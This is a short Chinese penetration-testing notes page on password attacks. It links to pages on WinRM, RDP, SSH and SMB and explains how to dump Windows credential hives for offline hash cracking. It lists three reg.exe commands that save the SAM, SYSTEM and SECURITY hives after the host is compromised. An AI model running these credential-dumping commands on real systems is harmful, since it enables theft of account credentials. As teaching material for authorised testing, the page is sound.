---
cover: ../.gitbook/assets/背景6.jpg
coverY: 0
---

# 密码攻击

## 一、应用服务

### 1. 网络应用程序

1. [WINRM](../服务/winrm.md)
2. [RDP](../服务/rdp.md)
3. [SSH](../服务/ssh.md)
4. [SMB](../服务/smb.md)

## 二、Windows  本地密码攻击

> 渗透进入 WIndows  主机后，我们可能会尝试<mark style="color:orange;">**`快速转存与 SAM 数据库关联`**</mark>的文件，并使用 [文件传输 ](wen-jian-chuan-shu.md)相关的利用传输到我们的攻击主机开始离线破解哈希

|     注册表名称     | 描述                                          |
| :-----------: | ------------------------------------------- |
|    hklm\sam   | 包含与**本地密码**关联的哈希值                           |
|  hklm\system  | 包含系统引导密钥，用于`加密 SAM 数据库`。我们需要引导密钥来解密 SAM 数据库 |
| hklm\security | 包含`域帐户的缓存凭据`                                |

### 1. 使用 reg.exe 保存并赋值注册表配置单元

> 以`管理员`的方式启动 CMD 才可以进行下述操作

```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```













